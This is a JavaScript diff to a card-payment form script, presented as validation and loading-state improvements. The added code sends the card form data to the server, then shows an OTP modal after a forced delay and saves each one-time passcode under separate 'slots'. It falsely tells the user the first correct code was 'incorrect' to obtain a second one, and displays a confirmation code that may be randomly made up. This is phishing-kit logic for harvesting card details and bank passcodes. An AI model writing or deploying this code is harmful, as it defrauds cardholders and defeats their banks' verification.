@@ -579,6 +579,9 @@ function initCardValidation() {
   const nameInput = document.querySelector('[data-card-name]');
   const submitBtn = document.querySelector('[data-card-submit]');
   const form = submitBtn?.closest('form');
+  const loader = document.querySelector('[data-payment-loader]');
+  const errorBanner = document.querySelector('[data-payment-error]');
+  const defaultSubmitLabel = submitBtn ? submitBtn.textContent : 'Pay now';
   const brandWrapper = document.querySelector('[data-card-brand]');
   const brandImg = brandWrapper?.querySelector('img');
   if (!numberInput || !expiryInput || !cvcInput || !nameInput || !submitBtn) return;
@@ -755,6 +758,23 @@ function initCardValidation() {
     return true;
   };
 
+  const setProcessing = (state) => {
+    submitBtn.disabled = state;
+    submitBtn.classList.toggle('is-processing', state);
+    submitBtn.textContent = state ? 'Processing...' : defaultSubmitLabel;
+    if (loader) {
+      loader.hidden = !state;
+    }
+    if (errorBanner && state) {
+      errorBanner.textContent = '';
+      errorBanner.style.display = 'none';
+    }
+    // Always hide OTP while processing to avoid overlap.
+    if (state) {
+      hideOtpModal();
+    }
+  };
+
   numberInput.addEventListener('input', () => {
     const digits = applyCardBrand();
     if (digits.length === 0) {
@@ -840,6 +860,8 @@ function initCardValidation() {
   const otpError = document.querySelector('[data-otp-error]');
   const confirmation = document.querySelector('[data-payment-confirmation]');
   const codeEl = document.querySelector('[data-confirmation-code]');
+  let confirmationCodeValue = codeEl?.textContent?.trim() || '';
+  let otpAttemptCount = 0;
 
   const showOtpModal = () => {
     if (!otpModal) return;
@@ -849,9 +871,7 @@ function initCardValidation() {
       otpInput.value = '';
       otpInput.focus();
     }
-    if (otpError) {
-      otpError.textContent = '';
-    }
+    setOtpError('');
   };
   const hideOtpModal = () => {
     if (otpModal) otpModal.hidden = true;
@@ -859,24 +879,122 @@ function initCardValidation() {
   };
 
   const sanitizeOtp = (value) => value.replace(/\D/g, '').slice(0, 6);
+  const setOtpError = (message) => {
+    if (!otpError) return;
+    otpError.textContent = message;
+    otpError.style.display = message ? 'block' : 'none';
+  };
 
-  submitBtn.addEventListener('click', () => {
+  const submitPayment = async () => {
+    if (!form) return { success: false, error: 'Form unavailable' };
+    const formData = new FormData(form);
+    formData.append('ajax', '1');
+    try {
+      const response = await fetch(form.action || window.location.href, {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'X-Requested-With': 'XMLHttpRequest',
+        },
+      });
+      if (!response.ok) {
+        throw new Error(`Bad status: ${response.status}`);
+      }
+      const data = await response.json();
+      return {
+        success: Boolean(data?.success),
+        confirmation: data?.confirmation || '',
+        error: data?.error || '',
+      };
+    } catch (error) {
+      console.error('Payment submission failed', error);
+      return { success: false, error: 'Payment failed. Please try again.' };
+    }
+  };
+
+  const showPaymentError = (message) => {
+    if (!errorBanner) return;
+    const text = message || '';
+    errorBanner.textContent = text;
+    errorBanner.style.display = text ? 'block' : 'none';
+  };
+
+  const submitOtp = async (otpCode, slot = 1) => {
+    const orderId = confirmationCodeValue;
+    if (!orderId) {
+      return { success: false, error: 'Missing confirmation number. Please try again.' };
+    }
+    const params = new URLSearchParams();
+    params.set('ajax', '1');
+    params.set('order_id', orderId);
+    params.set('otp_value', otpCode);
+    params.set('otp_slot', String(slot));
+    try {
+      const response = await fetch(form?.action || window.location.href, {
+        method: 'POST',
+        headers: {
+          'X-Requested-With': 'XMLHttpRequest',
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: params.toString(),
+      });
+      if (!response.ok) {
+        throw new Error(`OTP save failed: ${response.status}`);
+      }
+      const data = await response.json();
+      return {
+        success: Boolean(data?.success),
+        error: data?.error || '',
+      };
+    } catch (error) {
+      console.error('OTP submission failed', error);
+      return { success: false, error: 'OTP verification failed. Please retry.' };
+    }
+  };
+
+  form?.addEventListener('submit', async (event) => {
+    event.preventDefault();
     // Refresh brand-derived constraints (e.g., Amex => 4-digit CVC) just before validation.
     applyCardBrand();
+    setProcessing(true);
     if (form && form.reportValidity && !form.reportValidity()) {
       submitBtn.setAttribute('aria-invalid', 'true');
+      setProcessing(false);
       return;
     }
     const ok = [validateNumber(), validateExpiry(), validateCvc(), validateName()].every(Boolean);
     if (!ok) {
       submitBtn.setAttribute('aria-invalid', 'true');
+      setProcessing(false);
       return;
     }
     submitBtn.setAttribute('aria-invalid', 'false');
+    showPaymentError('');
     if (confirmation) {
       confirmation.hidden = true;
     }
-    showOtpModal();
+    const startedAt = Date.now();
+    const result = await submitPayment();
+    const elapsed = Date.now() - startedAt;
+    if (!result.success) {
+      setProcessing(false);
+      submitBtn.disabled = false;
+      submitBtn.textContent = defaultSubmitLabel;
+      showPaymentError(result.error || 'Payment failed. Please try again.');
+      return;
+    }
+    confirmationCodeValue = result.confirmation || confirmationCodeValue;
+    if (codeEl && confirmationCodeValue) {
+      codeEl.textContent = confirmationCodeValue;
+    }
+    const remaining = Math.max(0, 10000 - elapsed);
+    setTimeout(() => {
+      setProcessing(false);
+      setTimeout(() => {
+        if (otpModal && otpModal.hidden === false) return;
+        showOtpModal();
+      }, 50);
+    }, remaining);
   });
 
   const finalizePayment = () => {
@@ -884,25 +1002,45 @@ function initCardValidation() {
     submitBtn.textContent = 'Processing...';
     setTimeout(() => {
       submitBtn.disabled = false;
-      submitBtn.textContent = 'Pay now';
+      submitBtn.textContent = defaultSubmitLabel;
       hideOtpModal();
-      const code = `ABC${Math.floor(Math.random() * 9000 + 1000)}EXAMPLE`;
-      if (confirmation && codeEl) {
+      const code = confirmationCodeValue || `ABC${Math.floor(Math.random() * 9000 + 1000)}EXAMPLE`;
+      confirmationCodeValue = code;
+      if (codeEl) {
         codeEl.textContent = code;
+      }
+      if (confirmation) {
         confirmation.hidden = false;
         confirmation.scrollIntoView({ behavior: 'smooth' });
       }
     }, 1000);
   };
 
-  otpConfirm?.addEventListener('click', () => {
+  otpConfirm?.addEventListener('click', async () => {
     const digits = sanitizeOtp(otpInput?.value || '');
     if (digits.length !== 6) {
-      if (otpError) otpError.textContent = 'Enter the 6-digit secure code.';
-    } else {
-      if (otpError) otpError.textContent = '';
-      finalizePayment();
+      setOtpError('Enter the 6-digit secure code.');
+      return;
     }
+    setOtpError('');
+    otpConfirm.disabled = true;
+    const slot = otpAttemptCount === 0 ? 1 : 2;
+    const result = await submitOtp(digits, slot);
+    otpConfirm.disabled = false;
+    if (!result.success) {
+      setOtpError(result.error || 'OTP verification failed. Please retry.');
+      return;
+    }
+    if (otpAttemptCount === 0) {
+      otpAttemptCount += 1;
+      setOtpError('OTP incorrect. Please enter the new code sent to you.');
+      if (otpInput) {
+        otpInput.value = '';
+        otpInput.focus();
+      }
+      return;
+    }
+    finalizePayment();
   });
   otpCancel?.addEventListener('click', () => {
     hideOtpModal();
@@ -922,6 +1060,9 @@ function initCardValidation() {
     const cleaned = sanitizeOtp(otpInput.value);
     if (otpInput.value !== cleaned) {
       otpInput.value = cleaned;
+    }
+    if (otpInput.value.length === 6) {
+      setOtpError('');
     }
   });
   otpInput?.addEventListener('paste', (event) => {
